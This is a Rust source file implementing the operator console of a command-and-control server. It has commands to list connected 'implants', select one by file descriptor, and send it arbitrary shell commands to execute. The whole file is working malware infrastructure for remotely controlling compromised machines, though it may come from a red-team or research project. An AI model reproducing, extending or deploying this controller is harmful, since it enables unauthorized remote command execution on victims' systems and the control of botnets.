use std::{stringify, sync::{Arc, Mutex}, os::unix::prelude::RawFd};
use libvoid::{errors::{CliResult, CliError}, enums::Protocol};
use log::info;

use crate::structs::cnc::Cnc;
type Args<'a> = Vec<&'a str>;

macro_rules! make_enum {
    ($lt: tt, $name: ident <$cmdt: ty, $argst: ty> { $($op: ident = $code: ident),+ $(,)? }, { $($op2: ident($opt: ty) = $code2: ident),+ $(,)? }) => {
        #[derive(Debug)]
        pub enum $name<$lt> {
            $($op),+,
            $($op2($opt)),+
        }

        impl<$lt> TryFrom<($cmdt, $argst)> for $name<$lt> {
            type Error = CliError;
            fn try_from(value: ($cmdt, $argst)) -> Result<Self, Self::Error> {
                match value.0 {
                    $(stringify!($code) => Ok(Self::$op)),+,
                    $(stringify!($code2) => Ok(Self::$op2(value.1))),+,
                    _ => Err(CliError::CommandInvalid(value.0.to_string()))
                } 
            }
        }
        
        impl std::fmt::Display for $name<'_> {
            fn fmt(&self, f: &mut std::fmt::Formatter) -> std::fmt::Result {
                write!(f, "{:?}", self)
            }
        }

        impl $name<'_> {
            pub fn handle(&self, ctx: &mut Option<RawFd>, cnc: &Arc<Mutex<Cnc>>) -> CliResult<()> {
                match self {
                    $($name::$op => self.$code(ctx, cnc)),+,
                    $($name::$op2(arg) => self.$code2(ctx, cnc, arg)),+,
                }
            }
        }
    };
}

make_enum!('a, Command<&str, Args<'a>> {
    Help = help,
    List = list,
    Unset = unset,
    Exit = exit,
}, {
    Set(Args<'a>) = set,
    Cmd(Args<'a>) = cmd
});

impl Command<'_> {
    fn help(&self, _ctx: &Option<RawFd>, _cnc: &Arc<Mutex<Cnc>>) -> CliResult<()> {
        println!(
            "{: <10} | {: <30}",
            "cmd", "info"
        );
        println!("-------------------------------------------------");
        println!(
            "{: <10} | {: <30}",
            "list", "list currently active implants"
        );
        println!(
            "{: <10} | {: <30}",
            "set", "set the context to a specific implant"
        );
        println!(
            "{: <10} | {: <30}",
            "unset", "unset the context"
        );
        println!(
            "{: <10} | {: <30}",
            "cmd", "have an implant execute a command"
        );
        println!(
            "{: <10} | {: <30}",
            "exit", "Exit the CNC"
        );
        Ok(())
    }

    fn list(&self, _ctx: &Option<RawFd>, cnc: &Arc<Mutex<Cnc>>) -> CliResult<()> {

        println!(
            "{: <10} | {: <20} | {: <10}", 
            "fd", "addr", "last ping"
        );
        println!("-------------------------------------------------");
        cnc.lock().unwrap().get_implants().iter().for_each(|implant| {
            println!(
                "{: <10} | {: <20} | {: <10}", 
                implant.get_fd(), implant.get_addr_str(), implant.print_last_ping());    
        });
        Ok(())
    }

    fn set(&self, ctx: &mut Option<RawFd>, cnc: &Arc<Mutex<Cnc>>, args: &Args) -> CliResult<()> { 
        let val: usize = match args[0].parse::<usize>() {
            Ok(val) => val,
            Err(_) => return Err(CliError::CommandError(format!("The value `{}' is not an integer", args[0]) ))
        };

        if cnc.lock().unwrap().get_implant_fd_list().contains(&(val as RawFd)) {
            *ctx = Some(val as RawFd);
            return Ok(());
        }
        Err(CliError::CommandError(format!("The fd `{}' does not exist", val)))
    }

    fn unset(&self, ctx: &mut Option<RawFd>, _cnc: &Arc<Mutex<Cnc>>) -> CliResult<()> {
        *ctx = None;
        Ok(())
    }

    fn exit(&self, _ctx: &Option<RawFd>, _cnc: &Arc<Mutex<Cnc>>) -> CliResult<()> {
        std::process::exit(0)
    }

    fn cmd(&self, ctx: &Option<RawFd>, cnc: &Arc<Mutex<Cnc>>, args: &Args) -> CliResult<()> {
        let fd = match *ctx {
            Some(val) => val,
            None => return Err(CliError::CommandInvalid(format!("Please set a valid context first.")))
        };

        let cmd = args.join(" ");
        info!("Sending command {} to implant {}", cmd, fd);

        let mut buf = Vec::<u8>::new();
        buf.push(Protocol::RequestCmd.value());
        buf.append(&mut cmd.as_bytes().to_vec());

        cnc.lock().unwrap().send_to_implant(fd, &buf);
        Ok(())
    }
}